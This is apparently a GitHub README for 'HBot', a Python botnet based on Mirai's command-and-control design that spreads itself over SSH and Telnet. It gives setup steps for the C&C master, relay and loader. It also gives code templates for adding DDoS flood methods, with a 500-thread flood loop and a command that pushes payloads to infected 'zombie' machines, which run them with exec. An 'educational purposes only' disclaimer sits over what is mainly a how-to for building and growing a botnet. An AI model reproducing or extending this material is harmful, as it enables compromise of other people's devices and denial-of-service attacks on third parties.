<h1 align="center">HBot</h1>

<p align='center'>
    <b>Self spreading Botnet based on Mirai C&C Arch, spreading through SSH and Telnet protocol.<br>Modern script fullly written in python3.</b><br>
    <br>
    <img src='https://media.discordapp.net/attachments/883871285808099329/884117319448682566/unknown.png'>
</p>

----

<br><br>

> # Warning.

* ***This project was made for educational purposes only! I take no responsibility for anything you do with this program.***
* ***If you have any suggestions, problems, open a problem (if it is an error, you must be sure to look if you can solve it with [Google](https://giybf.com)!)***

<br>

> # Requirements.

* A **Brain**, *yes skiddie, you need to use your brain, but d'ont worry because [Google](https://giybf.com) is your best friend !*
* A [MongoDB](https://mongodb.com) account, you must create an **cluster** with **database**, show [tutorial](https://docs.atlas.mongodb.com/getting-started/).
* A [Ngrok](https://ngrok.com) account, (save your **api-key**)
* __3__ Open port. Default: **8080**, **1337**, **667**
* VPS with __Debian__ based distribution.
* Time..

<br>

> # How to setup.

for the moment you can use that: [https://github.com/Its-Vichy/Mirkat](https://github.com/Its-Vichy/Mirkat)

* *Change the permissions of the scripts with the chmod command.*
```sh
chmod +x ./script/*.sh
```

* *Run installation script.*
```sh
./Install.sh
```

* *Start C&C Master server.*
```sh
./RunMaster.sh
```

* *Start Relay server.*
* **Note**: If you have more than one VPS, you can run relay on other server.
```sh
./RunMaster.sh
```

* *When you have enough new bots, you can expand your network by starting the loader.*
```sh
./Loader.sh
```

<br>

> # Custom payload.

***If you whant to share your methods, just create pull requests <3***

1. Create your method with the template (*#1*)
2. You need to add your method in class `Zombie` (**cnc.py** / *#2*)
3. If you whant to add module (no pypi) you need to follow *#3* in **zombie.py**


- #1:
```py
import socket, threading, time

__THREAD_NUMBER__ = 500

def method_name(ip: str, port: str, timeout: str):
    def flood(ip: str, port: int, timeout: int):
        start_time = int(time.time())

        while int(time.time()) - start_time < timeout:
            # write method code here
            # Exemple: https://github.com/Its-Vichy/HBot/blob/main/src/payload/http_flood.py

    for _ in range(int(__THREAD_NUMBER__)):
        threading.Thread(target= flood, args=(ip, int(port), int(timeout))).start()

method_name('!ip!', '!port!', '!time!')
```

- #2:
```py
def ddos_payload(self, ip: str, port: str, timeout: str, type: str):
    if type == 'http':
        payload = self.parse_method('./payload/http_flood.py', ip, port, timeout)
    
    if type == 'your method name without space lmao':
        payload = self.parse_method('./payload/your_method_file.py', ip, port, timeout)
        
    self.send(f'run|{payload}')
```
 
 - #3
 ```py
 # Just look for this line
 # add: 'module_name': module_name
 # Ex: 'random': random
 threading.Thread(target= exec, args=(payload, {'threading': threading, 'socket': socket, 'time': time, 'module_name': module_name})).start()
 ```
 
<br>

> # How is working.

* **Loader**: soon..
* **Relay**: soon..
* **C&C**: soon..

<br>

> # Support me.

* ⚠️ If this repository was empty, its because the project stay in **developpement**.
* Thanks for looking at this repository, if you like to press the ⭐ button!
* Made with 💖 by [Vichy](https://github.com/Its-Vichy).
* RCΛ Love u.

<p align="center"> 
    <b>Informations</b><br>
    <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/Its-Vichy/HBot?style=social">
    <img alt="GitHub top language" src="https://img.shields.io/github/languages/top/Its-Vichy/HBot">
    <img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/Its-Vichy/HBot">
    <img alt="GitHub" src="https://img.shields.io/github/license/Its-Vichy/HBot">
    <img alt="GitHub watchers" src="https://img.shields.io/github/watchers/Its-Vichy/HBot?style=social">
</p>
